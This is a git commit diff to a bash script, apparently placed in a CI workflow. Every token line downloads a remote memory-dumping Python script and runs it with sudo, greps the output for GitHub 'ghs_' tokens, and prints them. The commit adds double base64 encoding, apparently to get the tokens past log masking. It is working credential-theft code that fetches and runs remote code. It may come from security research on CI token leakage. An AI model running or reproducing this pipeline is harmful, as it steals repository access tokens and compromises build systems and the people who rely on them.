9897580e8b6486e0a7fbd14365735b168a2ebd40
Victim User <46316318+r3s34rch@users.noreply.github.com>
2023-12-17 10:46:00 +0100

    Update bash.sh

--- bash.sh
+++ bash.sh
@@ -1,8 +1,8 @@
 .#!/usr/bin/env bash
 set -e
 readonly REPO="thi3nl0ng/thi3nl0ng.github.io"
-TOKEN_VAL=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | awk 'NR==2' | xargs  `
-TOKEN_VAL2=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u`
+TOKEN_VAL=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | awk 'NR==1' | xargs  `
+TOKEN_VAL2=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | base64 | base64 `
 echo "-----------------------------------------------------------------"
 echo "abc" "$TOKEN_VAL" "xyz"
 echo "-----------------------------------------------------------------"
